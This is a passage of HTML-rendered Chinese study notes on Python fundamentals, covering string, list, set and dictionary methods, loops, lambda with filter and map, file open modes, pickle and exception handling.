<td style="text-align:center">将字符串左侧空白删除</td>
</tr>
<tr>
<td style="text-align:center">.strip()</td>
<td style="text-align:center"></td>
<td style="text-align:center">新字符串</td>
<td style="text-align:center">将字符串两端空白删除</td>
</tr>
<tr>
<td style="text-align:center">str()</td>
<td style="text-align:center">1</td>
<td style="text-align:center">新字符串</td>
<td style="text-align:center">将参数类型转换为字符串</td>
</tr>
<tr>
<td style="text-align:center">.replace(old,new)</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center">将字符串中old替换成new字符串</td>
</tr>
<tr>
<td style="text-align:center">.split(sep=None)</td>
<td style="text-align:center">分隔符</td>
<td style="text-align:center">拆分后的列表</td>
<td style="text-align:center">用参数作为分隔符拆分字符串返回列表</td>
</tr>
<tr>
<td style="text-align:center">.join(iterable)</td>
<td style="text-align:center">序列</td>
<td style="text-align:center">字符串</td>
<td style="text-align:center">将参数序列用.前的字符作为分隔符拼起来</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
</tbody>
</table>
<h3 id="格式化">格式化<a class="header-anchor" href="#格式化"> ¶ </a></h3>
<h4 id="format格式化">format格式化<a class="header-anchor" href="#format格式化"> ¶ </a></h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 位置参数</span></span><br><span class="line"><span class="string">&quot;&#123;0&#125; love &#123;1&#125;&quot;</span>.<span class="built_in">format</span>(<span class="string">&quot;I&quot;</span>, <span class="string">&quot;you&quot;</span>)</span><br><span class="line"><span class="comment"># 关键字参数</span></span><br><span class="line"><span class="string">&quot;&#123;a&#125; love &#123;b&#125;&quot;</span>.<span class="built_in">format</span>(a = <span class="string">&quot;I&quot;</span>, b = <span class="string">&quot;you&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 若混合使用，位置参数必须在关键字参数的前面</span></span><br></pre></td></tr></table></figure>
<h4 id="格式化操作符">%格式化操作符<a class="header-anchor" href="#格式化操作符"> ¶ </a></h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;%c&quot;</span> % <span class="number">97</span></span><br><span class="line"><span class="comment"># 类似于C</span></span><br></pre></td></tr></table></figure>
<h2 id="序列">序列<a class="header-anchor" href="#序列"> ¶ </a></h2>
<h3 id="列表">列表<a class="header-anchor" href="#列表"> ¶ </a></h3>
<table>
<thead>
<tr>
<th style="text-align:center">方法/函数</th>
<th style="text-align:center">参数</th>
<th style="text-align:center">返回值</th>
<th style="text-align:center">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">list()</td>
<td style="text-align:center">可迭代对象</td>
<td style="text-align:center">列表</td>
<td style="text-align:center">将可迭代对象转换为列表</td>
</tr>
<tr>
<td style="text-align:center">len()</td>
<td style="text-align:center">列表</td>
<td style="text-align:center">列表长度</td>
<td style="text-align:center">返回列表长度</td>
</tr>
<tr>
<td style="text-align:center">max()</td>
<td style="text-align:center">列表</td>
<td style="text-align:center">一个列表元素</td>
<td style="text-align:center">返回列表中最大值</td>
</tr>
<tr>
<td style="text-align:center">min()</td>
<td style="text-align:center">列表</td>
<td style="text-align:center">一个列表元素</td>
<td style="text-align:center">返回列表中最小值</td>
</tr>
<tr>
<td style="text-align:center">.append()</td>
<td style="text-align:center">1</td>
<td style="text-align:center"></td>
<td style="text-align:center">将参数添加到列表末尾</td>
</tr>
<tr>
<td style="text-align:center">.insert()</td>
<td style="text-align:center">1,2</td>
<td style="text-align:center"></td>
<td style="text-align:center">将参数2<strong>插入</strong>到列表下标为参数1的位置</td>
</tr>
<tr>
<td style="text-align:center">del</td>
<td style="text-align:center">1(删除索引或切片)</td>
<td style="text-align:center"></td>
<td style="text-align:center">删除列表元素，用法<code>del alist[1]</code></td>
</tr>
<tr>
<td style="text-align:center">.pop()</td>
<td style="text-align:center">[1]</td>
<td style="text-align:center">删除的元素</td>
<td style="text-align:center">删除末尾元素，或下标为参数1的元素</td>
</tr>
<tr>
<td style="text-align:center">.remove()</td>
<td style="text-align:center">1</td>
<td style="text-align:center"></td>
<td style="text-align:center">删除列表中第一个值为参数1的元素</td>
</tr>
<tr>
<td style="text-align:center">.sort()</td>
<td style="text-align:center">[reverse=True]</td>
<td style="text-align:center"></td>
<td style="text-align:center">将原列表从小到大排序（+可选参数从大到小）</td>
</tr>
<tr>
<td style="text-align:center">sorted()</td>
<td style="text-align:center">1,[reverse=True]</td>
<td style="text-align:center">排序好的列表</td>
<td style="text-align:center">将参数1列表 sort排序</td>
</tr>
<tr>
<td style="text-align:center">.reverse()</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center">反转列表元素排列顺序</td>
</tr>
<tr>
<td style="text-align:center">.extend()</td>
<td style="text-align:center">1(一个列表)</td>
<td style="text-align:center"></td>
<td style="text-align:center">将参数列表添加到列表末尾</td>
</tr>
<tr>
<td style="text-align:center">+号运算符</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center">将两个列表合并</td>
</tr>
<tr>
<td style="text-align:center">.count()</td>
<td style="text-align:center">1</td>
<td style="text-align:center"></td>
<td style="text-align:center">统计参数在列表中出现的次数</td>
</tr>
<tr>
<td style="text-align:center">.index()</td>
<td style="text-align:center">1</td>
<td style="text-align:center"></td>
<td style="text-align:center">返回参数在列表中第一次出现的索引值</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
</tbody>
</table>
<h3 id="生成列表">生成列表<a class="header-anchor" href="#生成列表"> ¶ </a></h3>
<p>函数range(start,end,step)：包含start不包括end，步长为step</p>
<h4 id="生成序列、元组">生成序列、元组<a class="header-anchor" href="#生成序列、元组"> ¶ </a></h4>
<p><code>enumerate(iterable)</code>：生成一个二元组，每个二元组分别是可迭代对象的索引号和对应元素</p>
<p><code>zip(iter1,....)</code>：由多个可迭代对象生成多元组</p>
<h5 id="收集参数">收集参数<a class="header-anchor" href="#收集参数"> ¶ </a></h5>
<p>形参前加一个<code>*</code>，可获取任意数量的参数，将参数变为序列。</p>
<p>实参前加一个<code>*</code>，可将序列解包</p>
<h4 id="使用range-创建数字列表">使用range()创建数字列表<a class="header-anchor" href="#使用range-创建数字列表"> ¶ </a></h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">numbers = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">1</span>,<span class="number">6</span>))</span><br><span class="line"><span class="built_in">print</span>(numbers)</span><br><span class="line"><span class="comment">###########</span></span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">squares = [value**<span class="number">2</span> <span class="keyword">for</span> value <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">11</span>)]</span><br><span class="line"><span class="built_in">print</span>(squares)</span><br><span class="line"><span class="comment">############</span></span><br><span class="line">[<span class="number">1</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">16</span>, <span class="number">25</span>, <span class="number">36</span>, <span class="number">49</span>, <span class="number">64</span>, <span class="number">81</span>, <span class="number">100</span>]</span><br></pre></td></tr></table></figure>
<h4 id="列表的切片">列表的切片<a class="header-anchor" href="#列表的切片"> ¶ </a></h4>
<p>列表切片同 range</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">players = [<span class="string">&#x27;charles&#x27;</span>, <span class="string">&#x27;martina&#x27;</span>, <span class="string">&#x27;michael&#x27;</span>, <span class="string">&#x27;florence&#x27;</span>, <span class="string">&#x27;eli&#x27;</span>] </span><br><span class="line"><span class="built_in">print</span>(players[<span class="number">0</span>:<span class="number">3</span>])</span><br><span class="line"><span class="comment">##############</span></span><br><span class="line">[<span class="string">&#x27;charles&#x27;</span>, <span class="string">&#x27;martina&#x27;</span>, <span class="string">&#x27;michael&#x27;</span>]</span><br></pre></td></tr></table></figure>
<p>负数则倒数开始，-1是倒数第一个</p>
<h4 id="列表的复制">列表的复制<a class="header-anchor" href="#列表的复制"> ¶ </a></h4>
<p>使用切片来复制列表，不要直接用=</p>
<p>因为只是给原来的列表起了两个名字</p>
<h3 id="元组">元组<a class="header-anchor" href="#元组"> ¶ </a></h3>
<p>元组是不能被修改的列表</p>
<p>修改元组只能给元组变量重新赋值</p>
<p><strong>元组的定义是看<code>,</code>逗号，而不是小括号</strong></p>
<p>删除整个元组使用<code>del</code></p>
<p>tuple(ierable) ：将可迭代对象转换为元组</p>
<h3 id="集合">集合<a class="header-anchor" href="#集合"> ¶ </a></h3>
<p>集合 具有唯一性， 会自动删除重复的数据</p>
<h4 id="创建集合">创建集合<a class="header-anchor" href="#创建集合"> ¶ </a></h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">set1 = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>&#125;</span><br><span class="line">set2 = <span class="built_in">set</span>([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>])</span><br><span class="line">set1 == set2</span><br><span class="line"><span class="comment"># True</span></span><br></pre></td></tr></table></figure>
<p>使用add()添加元素，remove()移除元素</p>
<h4 id="不可变集合">不可变集合<a class="header-anchor" href="#不可变集合"> ¶ </a></h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">set3 = <span class="built_in">frozenset</span>([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>])</span><br></pre></td></tr></table></figure>
<h2 id="if">if<a class="header-anchor" href="#if"> ¶ </a></h2>
<p>连环判断else if可以写成elif</p>
<p>python的<code>and</code>对应<code>&amp;&amp;</code>；<code>or</code>对应<code>||</code></p>
<p>确定列表是否为空<code>if alist: #不为空则进入if</code></p>
<h3 id="三元运算符">三元运算符<a class="header-anchor" href="#三元运算符"> ¶ </a></h3>
<p><code>a = x if x&lt;y else y</code></p>
<p>如果if后条件为true，则为x；否则为y</p>
<h2 id="循环">循环<a class="header-anchor" href="#循环"> ¶ </a></h2>
<h3 id="for循环">for循环<a class="header-anchor" href="#for循环"> ¶ </a></h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">range</span>(stop)</span><br><span class="line"><span class="built_in">range</span>(start, stop)</span><br><span class="line"><span class="built_in">range</span>(start, stop, step)</span><br></pre></td></tr></table></figure>
<h3 id="while-循环">while 循环<a class="header-anchor" href="#while-循环"> ¶ </a></h3>
<p>else可用于for或者while，表示循环条件不成立时候应执行的内容</p>
<p>当循环有break和else时，break跳出时候并不会执行else内容</p>
<h2 id="字典">字典<a class="header-anchor" href="#字典"> ¶ </a></h2>
<p>字典示例</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">alien_0 = &#123;<span class="string">&#x27;color&#x27;</span>: <span class="string">&#x27;green&#x27;</span>, <span class="string">&#x27;points&#x27;</span>: <span class="number">5</span>&#125;</span><br></pre></td></tr></table></figure>
<p>访问字典</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(alien_0[<span class="string">&#x27;color&#x27;</span>])</span><br><span class="line"><span class="comment">#####################</span></span><br><span class="line">green</span><br></pre></td></tr></table></figure>
<p>添加键值对</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 直接添加</span></span><br><span class="line">alien_0[<span class="string">&#x27;x&#x27;</span>] = <span class="number">60</span></span><br></pre></td></tr></table></figure>
<p>创建空字典</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">alien_0 = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">## 用dict()创建字典</span></span><br><span class="line">d = <span class="built_in">dict</span>(((<span class="string">&#x27;name&#x27;</span>,<span class="string">&quot;Li&quot;</span>),(<span class="string">&quot;sex&quot;</span>,<span class="string">&quot;man&quot;</span>)))</span><br><span class="line"><span class="comment"># d为</span></span><br><span class="line">&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Li&#x27;</span>, <span class="string">&#x27;sex&#x27;</span>: <span class="string">&#x27;man&#x27;</span>&#125;</span><br></pre></td></tr></table></figure>
<p>修改键值</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 直接赋值修改</span></span><br><span class="line">alien_0[<span class="string">&#x27;color&#x27;</span>] = <span class="string">&#x27;red&#x27;</span></span><br></pre></td></tr></table></figure>
<p>删除键值</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 同列表</span></span><br><span class="line"><span class="keyword">del</span> alien_0[<span class="string">&#x27;x&#x27;</span>]</span><br></pre></td></tr></table></figure>
<h3 id="遍历字典">遍历字典<a class="header-anchor" href="#遍历字典"> ¶ </a></h3>
<h4 id="遍历所有的键值对">遍历所有的键值对<a class="header-anchor" href="#遍历所有的键值对"> ¶ </a></h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">user_0 = &#123; </span><br><span class="line">    <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;efermi&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;first&#x27;</span>: <span class="string">&#x27;enrico&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;last&#x27;</span>: <span class="string">&#x27;fermi&#x27;</span>, </span><br><span class="line">    &#125; </span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> key, value <span class="keyword">in</span> user_0.items(): </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\nKey: &quot;</span> + key) </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Value: &quot;</span> + value)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 方法 .items() 返回一个键值对列表</span></span><br></pre></td></tr></table></figure>
<h4 id="遍历所有键">遍历所有键<a class="header-anchor" href="#遍历所有键"> ¶ </a></h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> favorite_languages.keys():</span><br></pre></td></tr></table></figure>
<h4 id="遍历所有值">遍历所有值<a class="header-anchor" href="#遍历所有值"> ¶ </a></h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> favorite_languages.values():</span><br></pre></td></tr></table></figure>
<h3 id="字典内置方法">字典内置方法<a class="header-anchor" href="#字典内置方法"> ¶ </a></h3>
<ul>
<li><code>.fromkeys()</code>
<ul>
<li>用于创建并返回一个新的字典</li>
<li>第一个参数是字典的键<strong>序列</strong></li>
<li>第二个参数是键的值</li>
<li>会将所有键初始化为一个值</li>
</ul>
</li>
<li><code>.get()</code>
<ul>
<li>用于访问字典项</li>
<li>第一个参数为 需要查找值的 <strong>键</strong></li>
<li>第二个参数可选，如果没有找到返回的字符串</li>
</ul>
</li>
<li><code>.clear()</code>：用于清空字典</li>
<li><code>.copy()</code>：拷贝整个字典</li>
<li><code>.pop(key)</code>：弹出（删除）键</li>
<li><code>.popitem()</code>：弹出一个键值</li>
<li><code>.setdefault()</code>：类似于get查找，但如果查找不到键时候会自动添加进字典</li>
<li><code>.update()</code>：更新字典，例如<code>p.update(name = &quot;LiHua&quot;)</code></li>
</ul>
<p>当形参收集参数是 两个星号<code>**</code>时，参数会被打包成字典</p>
<h2 id="函数">函数<a class="header-anchor" href="#函数"> ¶ </a></h2>
<p>想在函数内修改全局变量，需要使用<code>global</code>关键字</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun</span>():</span></span><br><span class="line">    <span class="keyword">global</span> count</span><br><span class="line">    count = <span class="number">5</span></span><br><span class="line">    </span><br></pre></td></tr></table></figure>
<p>想在内部函数修改外部函数的局部变量，使用<code>nonlocal</code>关键字，用法同global</p>
<h3 id="lambda函数">lambda函数<a class="header-anchor" href="#lambda函数"> ¶ </a></h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">lambda</span> x,y:x+y</span><br><span class="line"><span class="comment"># :冒号 前为函数的参数，多个参数使用,分割</span></span><br><span class="line"><span class="comment"># 后为 函数的返回值</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 要想调用这个lambda函数，需要绑定一个名字</span></span><br><span class="line">p = <span class="keyword">lambda</span> x, y: x+y</span><br><span class="line">p(<span class="number">2</span>,<span class="number">3</span>)</span><br></pre></td></tr></table></figure>
<h3 id="filter-过滤器">filter() 过滤器<a class="header-anchor" href="#filter-过滤器"> ¶ </a></h3>
<p>两个参数</p>
<ul>
<li>
<p>第一个参数：为函数，则将第二个参数可迭代对象传进去，筛选出函数返回True的值</p>
<p>为None（不可省略），则将第二个参数中 为True的 筛选出来</p>
</li>
</ul>
<p>可结合lambda表达式</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">list</span>(<span class="built_in">filter</span>(<span class="keyword">lambda</span> x:x%<span class="number">2</span>,<span class="built_in">range</span>(<span class="number">10</span>)))</span><br><span class="line"><span class="comment"># 输出</span></span><br><span class="line">[<span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">9</span>]</span><br></pre></td></tr></table></figure>
<h3 id="map">map()<a class="header-anchor" href="#map"> ¶ </a></h3>
<p>map将第二个参数可迭代对象送到第一个参数函数内加工，返回加工后的返回值序列</p>
<p>第二个参数是收集参数，因此第一个参数 函数可以是多参数函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">list</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> x:<span class="number">2</span>*x,<span class="built_in">range</span>(<span class="number">10</span>)))</span><br><span class="line"><span class="comment"># 输出</span></span><br><span class="line">[<span class="number">0</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">12</span>, <span class="number">14</span>, <span class="number">16</span>, <span class="number">18</span>]</span><br></pre></td></tr></table></figure>
<h2 id="文件系统">文件系统<a class="header-anchor" href="#文件系统"> ¶ </a></h2>
<h3 id="打开文件">打开文件<a class="header-anchor" href="#打开文件"> ¶ </a></h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;read.txt&quot;</span>)	<span class="comment"># 以默认只读模式打开</span></span><br></pre></td></tr></table></figure>
<p>mode模式</p>
<table>
<thead>
<tr>
<th style="text-align:left">模式</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">t</td>
<td style="text-align:left">文本模式 (默认)。</td>
</tr>
<tr>
<td style="text-align:left">x</td>
<td style="text-align:left">写模式，新建一个文件，如果该文件已存在则会报错。</td>
</tr>
<tr>
<td style="text-align:left">b</td>
<td style="text-align:left">二进制模式。</td>
</tr>
<tr>
<td style="text-align:left">+</td>
<td style="text-align:left">打开一个文件进行更新(可读可写)。</td>
</tr>
<tr>
<td style="text-align:left">U</td>
<td style="text-align:left">通用换行模式（<strong>Python 3 不支持</strong>）。</td>
</tr>
<tr>
<td style="text-align:left">r</td>
<td style="text-align:left">以<strong>只读方式</strong>打开文件。文件的指针将会放在文件的开头。这是默认模式。</td>
</tr>
<tr>
<td style="text-align:left">rb</td>
<td style="text-align:left">以二进制格式打开一个文件用于只读。文件指针将会放在文件的开头。这是默认模式。一般用于非文本文件如图片等。</td>
</tr>
<tr>
<td style="text-align:left">r+</td>
<td style="text-align:left"><strong>打开一个文件用于读写</strong>。文件指针将会放在文件的开头。</td>
</tr>
<tr>
<td style="text-align:left">rb+</td>
<td style="text-align:left">以二进制格式打开一个文件用于读写。文件指针将会放在文件的开头。一般用于非文本文件如图片等。</td>
</tr>
<tr>
<td style="text-align:left">w</td>
<td style="text-align:left">打开一个文件<strong>只用于写入</strong>。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。</td>
</tr>
<tr>
<td style="text-align:left">wb</td>
<td style="text-align:left">以二进制格式打开一个文件只用于写入。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。一般用于非文本文件如图片等。</td>
</tr>
<tr>
<td style="text-align:left">w+</td>
<td style="text-align:left">打开一个文件用于读写。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。</td>
</tr>
<tr>
<td style="text-align:left">wb+</td>
<td style="text-align:left">以二进制格式打开一个文件用于读写。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。一般用于非文本文件如图片等。</td>
</tr>
<tr>
<td style="text-align:left">a</td>
<td style="text-align:left">**打开一个文件用于追加。**如果该文件已存在，文件指针将会放在文件的结尾。也就是说，新的内容将会被写入到已有内容之后。如果该文件不存在，创建新文件进行写入。</td>
</tr>
<tr>
<td style="text-align:left">ab</td>
<td style="text-align:left">以二进制格式打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。也就是说，新的内容将会被写入到已有内容之后。如果该文件不存在，创建新文件进行写入。</td>
</tr>
<tr>
<td style="text-align:left">a+</td>
<td style="text-align:left">打开一个文件用于读写。如果该文件已存在，文件指针将会放在文件的结尾。文件打开时会是追加模式。如果该文件不存在，创建新文件用于读写。</td>
</tr>
<tr>
<td style="text-align:left">ab+</td>
<td style="text-align:left">以二进制格式打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。如果该文件不存在，创建新文件用于读写。</td>
</tr>
</tbody>
</table>
<p>默认为文本模式，如果要以二进制模式打开，加上 <strong>b</strong> 。</p>
<h3 id="file-对象">file 对象<a class="header-anchor" href="#file-对象"> ¶ </a></h3>
<p>file 对象使用 open 函数来创建，下表列出了 file 对象常用的函数：</p>
<table>
<thead>
<tr>
<th style="text-align:left">序号</th>
<th style="text-align:left">方法及描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">1</td>
<td style="text-align:left"><a href="https://www.runoob.com/python3/python3-file-close.html">file.close()</a>关闭文件。关闭后文件不能再进行读写操作。</td>
</tr>
<tr>
<td style="text-align:left">2</td>
<td style="text-align:left"><a href="https://www.runoob.com/python3/python3-file-flush.html">file.flush()</a>刷新文件内部缓冲，直接把内部缓冲区的数据立刻写入文件, 而不是被动的等待输出缓冲区写入。</td>
</tr>
<tr>
<td style="text-align:left">3</td>
<td style="text-align:left"><a href="https://www.runoob.com/python3/python3-file-fileno.html">file.fileno()</a>返回一个整型的文件描述符(file descriptor FD 整型), 可以用在如os模块的read方法等一些底层操作上。</td>
</tr>
<tr>
<td style="text-align:left">4</td>
<td style="text-align:left"><a href="https://www.runoob.com/python3/python3-file-isatty.html">file.isatty()</a>如果文件连接到一个终端设备返回 True，否则返回 False。</td>
</tr>
<tr>
<td style="text-align:left">5</td>
<td style="text-align:left"><a href="https://www.runoob.com/python3/python3-file-next.html">file.next()</a>**Python 3 中的 File 对象不支持 next() 方法。**返回文件下一行。</td>
</tr>
<tr>
<td style="text-align:left">6</td>
<td style="text-align:left"><code>file.read([size])</code>从文件读取指定的字节数，<strong>如果未给定或为负则读取所有</strong>。</td>
</tr>
<tr>
<td style="text-align:left">7</td>
<td style="text-align:left"><code>file.readline([size])</code>读取整行，包括 “\n” 字符。</td>
</tr>
<tr>
<td style="text-align:left">8</td>
<td style="text-align:left"><code>file.readlines([sizeint])</code>读取所有行并返回列表，若给定sizeint&gt;0，返回总和大约为sizeint字节的行, 实际读取值可能比 sizeint 较大, 因为需要填充缓冲区。</td>
</tr>
<tr>
<td style="text-align:left">9</td>
<td style="text-align:left"><code>file.seek(offset[, whence])</code>移动文件读取指针到指定位置</td>
</tr>
<tr>
<td style="text-align:left">10</td>
<td style="text-align:left"><a href="https://www.runoob.com/python3/python3-file-tell.html">file.tell()</a>返回文件当前位置。</td>
</tr>
<tr>
<td style="text-align:left">11</td>
<td style="text-align:left"><code>file.truncate([size])</code>从文件的首行首字符开始截断，截断文件为 size 个字符，无 size 表示从当前位置截断；截断之后后面的所有字符被删除，其中 windows 系统下的换行代表2个字符大小。</td>
</tr>
<tr>
<td style="text-align:left">12</td>
<td style="text-align:left"><a href="https://www.runoob.com/python3/python3-file-write.html">file.write(str)</a>将字符串写入文件，返回的是写入的字符长度。</td>
</tr>
<tr>
<td style="text-align:left">13</td>
<td style="text-align:left"><a href="https://www.runoob.com/python3/python3-file-writelines.html">file.writelines(sequence)</a>向文件写入一个序列字符串列表，如果需要换行则要自己加入每行的换行符。</td>
</tr>
</tbody>
</table>
<ul>
<li><code>.tell()</code>：当前文件指针的位置</li>
</ul>
<h3 id="OS模块">OS模块<a class="header-anchor" href="#OS模块"> ¶ </a></h3>
<p><a href="https://www.runoob.com/python3/python3-os-file-methods.html">菜鸟教程OS模块</a></p>
<h3 id="pickle-保存数据">pickle 保存数据<a class="header-anchor" href="#pickle-保存数据"> ¶ </a></h3>
<p>pickling：将python的对象转换为二进制数据保存；unpickling：从二进制文件中读取python对象</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line">alist = [<span class="number">1</span>, <span class="number">3.14</span>, <span class="string">&quot;You&quot;</span>]</span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;alist.pkl&quot;</span>,<span class="string">&quot;wb&quot;</span>)</span><br><span class="line">pickle.dump(alist, file)</span><br><span class="line">file.close()</span><br><span class="line"><span class="comment">###############</span></span><br><span class="line"></span><br><span class="line"><span class="comment">############### 读取</span></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;alist.pkl&quot;</span>,<span class="string">&quot;rb&quot;</span>)</span><br><span class="line">alist = pickle.load(file)</span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure>
<h2 id="异常处理">异常处理<a class="header-anchor" href="#异常处理"> ¶ </a></h2>
<h3 id="捕获异常">捕获异常<a class="header-anchor" href="#捕获异常"> ¶ </a></h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="comment"># 检测范围</span></span><br><span class="line"><span class="keyword">except</span> Exception [<span class="keyword">as</span> reason]:	<span class="comment"># 后可省略，或者引用具体错误信息reason</span></span><br><span class="line">    <span class="comment"># 异常处理语句</span></span><br><span class="line"><span class="keyword">except</span> TypeError:</span><br><span class="line">    <span class="comment"># ...</span></span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    <span class="comment"># 无论是否出现异常都会被执行的内容</span></span><br></pre></td></tr></table></figure>
<h3 id="抛出异常">抛出异常<a class="header-anchor" href="#抛出异常"> ¶ </a></h3>
<p>使用<code>raise</code>关键字抛出异常</p>
